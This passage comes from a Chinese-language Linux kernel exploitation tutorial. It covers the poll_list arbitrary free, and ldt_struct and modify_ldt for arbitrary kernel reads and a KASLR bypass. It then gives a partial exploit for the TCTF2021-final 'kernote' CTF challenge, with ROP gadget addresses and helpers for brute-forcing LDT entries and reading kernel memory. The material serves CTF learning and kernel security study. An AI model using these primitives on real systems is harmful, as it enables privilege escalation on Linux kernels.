class="line">	<span class="keyword">if</span> (!user_write_access_begin(ufds, nfds * <span class="keyword">sizeof</span>(*ufds))and)</span><br><span class="line">		<span class="keyword">goto</span> out_fds;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (walk = head; walk; walk = walk-&gt;next) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> *<span class="title">fds</span> =</span> walk-&gt;entries;</span><br><span class="line">		<span class="type">int</span> j;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (j = walk-&gt;len; j; fds++, ufds++, j--)</span><br><span class="line">			unsafe_put_user(fds-&gt;revents, &amp;ufds-&gt;revents, Efault);</span><br><span class="line">  	&#125;</span><br><span class="line">	user_write_access_end();</span><br><span class="line"></span><br><span class="line">	err = fdcount;</span><br><span class="line">out_fds:</span><br><span class="line">	walk = head-&gt;next;</span><br><span class="line">	<span class="keyword">while</span> (walk) &#123; 		<span class="comment">// [6] 释放 poll_list: 遍历单链表, 释放每一个 poll_list, 这里可以利用</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">poll_list</span> *<span class="title">pos</span> =</span> walk;</span><br><span class="line">		walk = walk-&gt;next;</span><br><span class="line">		kfree(pos);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">Efault:</span><br><span class="line">	user_write_access_end();</span><br><span class="line">	err = -EFAULT;</span><br><span class="line">	<span class="keyword">goto</span> out_fds;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="任意地址释放">任意地址释放</h3>
<p>通过某种手段修改 <code>poll_list</code> 的 <code>next</code>
指针可以完成任意地址释放形成 UAF 。</p>
<figure>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/c2263a10fe98f8f823cbbe1d2c149b04.png"
                      alt="img" 
                >
<figcaption aria-hidden="true">img</figcaption>
</figure>
<h1 id="ldt_struct-与-modify_ldt-系统调用">ldt_struct 与 modify_ldt
系统调用</h1>
<h2 id="ldt_struct-kmalloc-16slubkmalloc-32slab">ldt_struct:
kmalloc-16(slub)/kmalloc-32(slab)</h2>
<p>在内核中与 LDT 相关联的结构体为 <code>ldt_struct</code>
。该结构体定义于内核源码 <code>arch/x86/include/asm/mmu_context.h</code>
中，如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> &#123;</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Xen requires page-aligned LDTs with special permissions.  This is</span></span><br><span class="line"><span class="comment">     * needed to prevent us from installing evil descriptors such as</span></span><br><span class="line"><span class="comment">     * call gates.  On native, we could merge the ldt_struct and LDT</span></span><br><span class="line"><span class="comment">     * allocations, but it&#x27;s not worth trying to optimize.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span>    *<span class="title">entries</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>        nr_entries;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * If PTI is in use, then the entries array is not mapped while we&#x27;re</span></span><br><span class="line"><span class="comment">     * in user mode.  The whole array will be aliased at the addressed</span></span><br><span class="line"><span class="comment">     * given by ldt_slot_va(slot).  We use two slots so that we can allocate</span></span><br><span class="line"><span class="comment">     * and map, and enable a new LDT without invalidating the mapping</span></span><br><span class="line"><span class="comment">     * of an older, still-in-use LDT.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * slot will be -1 if this LDT doesn&#x27;t have an alias mapping.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">int</span>            slot;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p><code>modify_ldt</code> 系统调用可以用来操纵对应进程的
<code>ldt_struct</code> 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">SYSCALL_DEFINE3(modify_ldt, <span class="type">int</span> , func , <span class="type">void</span> __user * , ptr ,</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> , bytecount)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> ret = -ENOSYS;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (func) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        ret = read_ldt(ptr, bytecount);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        ret = write_ldt(ptr, bytecount, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        ret = read_default_ldt(ptr, bytecount);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x11</span>:</span><br><span class="line">        ret = write_ldt(ptr, bytecount, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * The SYSCALL_DEFINE() macros give us an &#x27;unsigned long&#x27;</span></span><br><span class="line"><span class="comment">     * return type, but tht ABI for sys_modify_ldt() expects</span></span><br><span class="line"><span class="comment">     * &#x27;int&#x27;.  This cast gives us an int-sized value in %rax</span></span><br><span class="line"><span class="comment">     * for the return code.  The &#x27;unsigned&#x27; is necessary so</span></span><br><span class="line"><span class="comment">     * the compiler does not try to sign-extend the negative</span></span><br><span class="line"><span class="comment">     * return codes into the high half of the register when</span></span><br><span class="line"><span class="comment">     * taking the value from int-&gt;long.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3
id="分配gfp_kernelmodify_ldt-系统调用---write_ldt">分配（GFP_KERNEL）：modify_ldt
系统调用 - write_ldt()</h3>
<p><code>write_ldt()</code> 定义于
<code>/arch/x86/kernel/ldt.c</code>中，我们主要关注如下逻辑：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">write_ldt</span><span class="params">(<span class="type">void</span> __user *ptr, <span class="type">unsigned</span> <span class="type">long</span> bytecount, <span class="type">int</span> oldmode)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    error = -ENOMEM;</span><br><span class="line">    new_ldt = alloc_ldt_struct(new_nr_entries);</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>我们注意到在 <code>write_ldt()</code> 当中会使用
<code>alloc_ldt_struct()</code> 函数来为新的 <code>ldt_struct</code>
分配空间，随后将之应用到进程，<code>alloc_ldt_struct()</code> 函数定义于
<code>arch/x86/kernel/ldt.c</code> 中，我们主要关注如下逻辑：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* The caller must call finalize_ldt_struct on the result. LDT starts zeroed. */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">struct</span> ldt_struct *<span class="title function_">alloc_ldt_struct</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> num_entries)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> *<span class="title">new_ldt</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> alloc_size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (num_entries &gt; LDT_ENTRIES)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    new_ldt = kmalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ldt_struct), GFP_KERNEL);</span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure></div>
<p>即我们可以通过 <code>modify_ldt</code> 系统调用来分配新的
<code>ldt_struct</code> 。</p>
<h3 id="数据泄露modify_ldt-系统调用---read_ldt">数据泄露：modify_ldt
系统调用 - read_ldt()</h3>
<p><code>read_ldt()</code> 定义于
<code>/arch/x86/kernel/ldt.c</code>中，我们主要关注如下逻辑：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">read_ldt</span><span class="params">(<span class="type">void</span> __user *ptr, <span class="type">unsigned</span> <span class="type">long</span> bytecount)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    <span class="keyword">if</span> (copy_to_user(ptr, mm-&gt;context.ldt-&gt;entries, entries_size)) &#123;</span><br><span class="line">        retval = -EFAULT;</span><br><span class="line">        <span class="keyword">goto</span> out_unlock;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">out_unlock:</span><br><span class="line">    up_read(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>在这里会<strong>直接调用 copy_to_user
向用户地址空间拷贝数据</strong>，我们不难想到的是若是能够控制
<code>ldt-&gt;entries</code>
便能够完成内核的任意地址读，由此泄露出内核数据 。</p>
<p>开启 KASLR 的情况下首先需要泄露内核基址，再考虑进行任意地址读。</p>
<p>这里我们要用到 <code>copy_to_user()</code>
的一个特性：对于非法地址，其<strong>并不会造成 kernel
panic，只会返回一个非零的错误码</strong>，我们不难想到的是，我们可以多次修改
ldt-&gt;entries 并多次调用 <code>modify_ldt()</code> 以<strong>爆破内核
.text 段地址与 page_offset_base</strong>，若是成功命中，则
<code>modify_ldt</code> 会返回给我们一个非负值 。</p>
<p>但直接爆破代码段地址并非一个明智的选择，由于
<code>Hardened usercopy</code>
的存在，对于直接拷贝代码段上数据的行为会导致 kernel panic。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Validates that the given object is:</span></span><br><span class="line"><span class="comment"> * - not bogus address</span></span><br><span class="line"><span class="comment"> * - fully contained by stack (or stack frame, when available)</span></span><br><span class="line"><span class="comment"> * - fully within SLAB object (or object whitelist area, when available)</span></span><br><span class="line"><span class="comment"> * - not in kernel text</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> __check_object_size(<span class="type">const</span> <span class="type">void</span> *ptr, <span class="type">unsigned</span> <span class="type">long</span> n, <span class="type">bool</span> to_user)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">	<span class="comment">/* Check for bad heap object. */</span></span><br><span class="line">	check_heap_object(ptr, n, to_user);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Check for object in kernel to avoid text exposure. */</span></span><br><span class="line">	check_kernel_text_object((<span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span>)ptr, n, to_user);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_HARDENED_USERCOPY</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> __check_object_size(<span class="type">const</span> <span class="type">void</span> *ptr, <span class="type">unsigned</span> <span class="type">long</span> n,</span><br><span class="line">					<span class="type">bool</span> to_user);</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> <span class="title function_">check_object_size</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *ptr, <span class="type">unsigned</span> <span class="type">long</span> n,</span></span><br><span class="line"><span class="params">					      <span class="type">bool</span> to_user)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (!__builtin_constant_p(n))</span><br><span class="line">		__check_object_size(ptr, n, to_user);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">check_object_size</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *ptr, <span class="type">unsigned</span> <span class="type">long</span> n,</span></span><br><span class="line"><span class="params">				     <span class="type">bool</span> to_user)</span></span><br><span class="line">&#123; &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_HARDENED_USERCOPY */</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">bool</span></span><br><span class="line"><span class="title function_">check_copy_size</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *addr, <span class="type">size_t</span> bytes, <span class="type">bool</span> is_source)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">	check_object_size(addr, bytes, is_source);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">unsigned</span> <span class="type">long</span> __must_check</span><br><span class="line"><span class="title function_">copy_to_user</span><span class="params">(<span class="type">void</span> __user *to, <span class="type">const</span> <span class="type">void</span> *from, <span class="type">unsigned</span> <span class="type">long</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (likely(check_copy_size(from, n, <span class="literal">true</span>)))</span><br><span class="line">		n = _copy_to_user(to, from, n);</span><br><span class="line">	<span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>因此现实场景中我们很难直接爆破代码段加载基地址，但是<strong>在
page_offset_base + 0x9d000 的地方存储着 secondary_startup_64
函数的地址</strong>，因此我们可以直接将
<code>ldt_struct-&gt;entries</code> 设为
<code>page_offset_base + 0x9d000</code> 之后再通过
<code>read_ldt()</code> 进行读取即可泄露出内核代码段基地址。</p>
<p>虽然在线性映射区域可以任意地址读，但是由于
<code>check_heap_object</code> 的检查，当读取长度超过其中指向的 object
范围则会触发 kernel panic（前面爆破 <code>page_offset_base</code>
可以通过 hardened usercopy 检查是因为每次读 8 字节一定在 object
范围）。</p>
<p>ldt
是一个与进程全局相关的东西，因此现在让我们将目光放到与进程相关的其他方面上——观察
fork 系统调用的源码，我们可以发现如下执行链：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sys_fork()</span><br><span class="line">    kernel_clone()</span><br><span class="line">        copy_process()</span><br><span class="line">            copy_mm()</span><br><span class="line">                dup_mm()</span><br><span class="line">                    dup_mmap()</span><br><span class="line">                        arch_dup_mmap()</span><br><span class="line">                            ldt_dup_context()</span><br></pre></td></tr></table></figure></div>
<p><code>ldt_dup_context()</code> 定义于
<code>arch/x86/kernel/ldt.c</code> 中，注意到如下逻辑：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Called on fork from arch_dup_mmap(). Just copy the current LDT state,</span></span><br><span class="line"><span class="comment"> * the new task is not running, so nothing can be installed.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">ldt_dup_context</span><span class="params">(<span class="keyword">struct</span> mm_struct *old_mm, <span class="keyword">struct</span> mm_struct *mm)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_mm-&gt;context.ldt-&gt;entries,</span><br><span class="line">           new_ldt-&gt;nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line"></span><br><span class="line">       <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>在这里会通过 <code>memcpy</code> 将父进程的
<code>ldt-&gt;entries</code>
拷贝给子进程，<strong>是完全处在内核中的操作</strong>，因此不会触发
hardened usercopy
的检查，我们只需要在父进程中设定好搜索的地址之后再开子进程来用
<code>read_ldt()</code> 读取数据即可。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/022d89eef3fe10e193f1a57a1f8f472c.png"
                     
alt="在这里插入图片描述" 
                ></p>
<h2 id="例题tctf2021-final-kernote">例题：TCTF2021-FINAL kernote</h2>
<p><a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/linux_kernel_pwn/TCTF2021final_kernote" >附件下载链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<ul>
<li><p>0x6666 功能将 object 指针保存在 <code>note</code> 中。</p>
<p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( request == <span class="number">0x6666</span> )                    <span class="comment">// copy ptr</span></span><br><span class="line">&#123;</span><br><span class="line">  v10 = <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( val &gt; <span class="number">0xF</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">  note = buf[val];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></p></li>
<li><p>0x6668 功能释放 object 同时将 <code>buf</code> 中存放的 object
指针清空。</p>
<p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( request == <span class="number">0x6668</span> )                      <span class="comment">// delete</span></span><br><span class="line">&#123;</span><br><span class="line">  v10 = <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( val &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    object = buf[val];</span><br><span class="line">    <span class="keyword">if</span> ( object )</span><br><span class="line">    &#123;</span><br><span class="line">      kfree(object);</span><br><span class="line">      v10 = <span class="number">0LL</span>;</span><br><span class="line">      buf[val] = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></p></li>
<li><p>0x6669 功能修改 object 的前 8 字节，这里是根据 <code>note</code>
访问 object 因此存在 UAF 。</p>
<p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( request == <span class="number">0x6669</span> )                      <span class="comment">// edit</span></span><br><span class="line">&#123;</span><br><span class="line">  v10 = <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( note )</span><br><span class="line">  &#123;</span><br><span class="line">    *note = val;</span><br><span class="line">    v10 = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></p></li>
</ul>
<p>因此通过 ldt 泄露内核基址之后利用 <code>seq_operations</code> +
<code>pt_regs</code> 写 rop 实现提权。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0xffffffff8266b780</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xffffffff810c9dd0</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rdi_ret = <span class="number">0xffffffff81075c4c</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff81c00fb0</span>;</span><br><span class="line"><span class="type">size_t</span> add_rsp_0x198_ret = <span class="number">0xffffffff810b3f9b</span>;</span><br><span class="line"><span class="type">int</span> kernote_fd, seq_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">chunk_set</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">    ioctl(kernote_fd, <span class="number">0x6666</span>, index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">chunk_add</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">    ioctl(kernote_fd, <span class="number">0x6667</span>, index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">chunk_delete</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">    ioctl(kernote_fd, <span class="number">0x6668</span>, index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">chunk_edit</span><span class="params">(<span class="type">size_t</span> data)</span> &#123;</span><br><span class="line">    ioctl(kernote_fd, <span class="number">0x6669</span>, data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span> &#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECONDARY_STARTUP_64 0xFFFFFFFF81000040</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LDT_BUF_SIZE  0x8000</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">init_desc</span><span class="params">(<span class="keyword">struct</span> user_desc *desc)</span> &#123;</span><br><span class="line">    desc-&gt;base_addr = <span class="number">0xff0000</span>;</span><br><span class="line">    desc-&gt;entry_number = <span class="number">0x8000</span> / <span class="number">8</span>;</span><br><span class="line">    desc-&gt;limit = <span class="number">0</span>;</span><br><span class="line">    desc-&gt;seg_32bit = <span class="number">0</span>;</span><br><span class="line">    desc-&gt;contents = <span class="number">0</span>;</span><br><span class="line">    desc-&gt;limit_in_pages = <span class="number">0</span>;</span><br><span class="line">    desc-&gt;lm = <span class="number">0</span>;</span><br><span class="line">    desc-&gt;read_exec_only = <span class="number">0</span>;</span><br><span class="line">    desc-&gt;seg_not_present = <span class="number">0</span>;</span><br><span class="line">    desc-&gt;useable = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">ldt_guessing_direct_mapping_area</span><span class="params">(<span class="type">void</span> *(*ldt_cracker)(<span class="type">void</span> *),</span></span><br><span class="line"><span class="params">                                        <span class="type">void</span> *cracker_args,</span></span><br><span class="line"><span class="params">                                        <span class="type">void</span> *(*ldt_momdifier)(<span class="type">void</span> *, <span class="type">size_t</span>),</span></span><br><span class="line"><span class="params">                                        <span class="type">void</span> *momdifier_args,</span></span><br><span class="line"><span class="params">                                        <span class="type">uint64_t</span> burte_size)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> <span class="title">desc</span>;</span></span><br><span class="line">    <span class="type">uint64_t</span> page_offset_base = <span class="number">0xffff888000000000</span> - burte_size;</span><br><span class="line">    <span class="type">uint64_t</span> temp;</span><br><span class="line">    <span class="type">int</span> retval;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* init descriptor info */</span></span><br><span class="line">    init_desc(&amp;desc);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* make the ldt_struct modifiable */</span></span><br><span class="line">    ldt_cracker(cracker_args);</span><br><span class="line">    syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;desc, <span class="keyword">sizeof</span>(desc));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* leak kernel direct mapping area by modify_ldt() */</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        ldt_momdifier(momdifier_args, page_offset_base);</span><br><span class="line">        retval = syscall(SYS_modify_ldt, <span class="number">0</span>, &amp;temp, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> (retval &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (retval == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] no mm-&gt;context.ldt!&quot;</span>);</span><br><span class="line">            page_offset_base = <span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        page_offset_base += burte_size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> page_offset_base;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">ldt_arbitrary_read</span><span class="params">(<span class="type">void</span> *(*ldt_momdifier)(<span class="type">void</span> *, <span class="type">size_t</span>),</span></span><br><span class="line"><span class="params">                        <span class="type">void</span> *momdifier_args, <span class="type">size_t</span> addr, <span class="type">char</span> *res_buf)</span> &#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">char</span> buf[LDT_BUF_SIZE];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> <span class="title">desc</span>;</span></span><br><span class="line">    <span class="type">int</span> pipe_fd[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* init descriptor info */</span></span><br><span class="line">    init_desc(&amp;desc);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* modify the ldt_struct-&gt;entries to addr */</span></span><br><span class="line">    ldt_momdifier(momdifier_args, addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* read data by the child process */</span></span><br><span class="line">    pipe(pipe_fd);</span><br><span class="line">    <span class="keyword">if</span> (!fork()) &#123;</span><br><span class="line">        <span class="comment">/* child */</span></span><br><span class="line">        syscall(SYS_modify_ldt, <span class="number">0</span>, buf, LDT_BUF_SIZE);</span><br><span class="line">        write(pipe_fd[<span class="number">1</span>], buf, LDT_BUF_SIZE);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* parent */</span></span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">        read(pipe_fd[<span class="number">0</span>], res_buf, LDT_BUF_SIZE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    close(pipe_fd[<span class="number">0</span>]);</span><br><span class="line">    close(pipe_fd[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">ldt_seeking_memory</span><span class="params">(<span class="type">void</span> *(*ldt_momdifier)(<span class="type">void</span> *, <span class="type">size_t</span>),</span></span><br><span class="line"><span class="params">                          <span class="type">void</span> *momdifier_args, <span class="type">uint64_t</span> search_addr,</span></span><br><span class="line"><span class="params">                          <span class="type">size_t</span> (*mem_finder)(<span class="type">void</span> *, <span class="type">char</span> *), <span class="type">void</span> *finder_args, <span class="type">bool</span> ret_val)</span> &#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">char</span> buf[LDT_BUF_SIZE];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        ldt_arbitrary_read(ldt_momdifier, momdifier_args, search_addr, buf);</span><br><span class="line">        <span class="type">size_t</span> res = mem_finder(finder_args, buf);</span><br><span class="line">        <span class="keyword">if</span> (res != <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ret_val ? res : res + search_addr;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        search_addr += <span class="number">0x8000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span 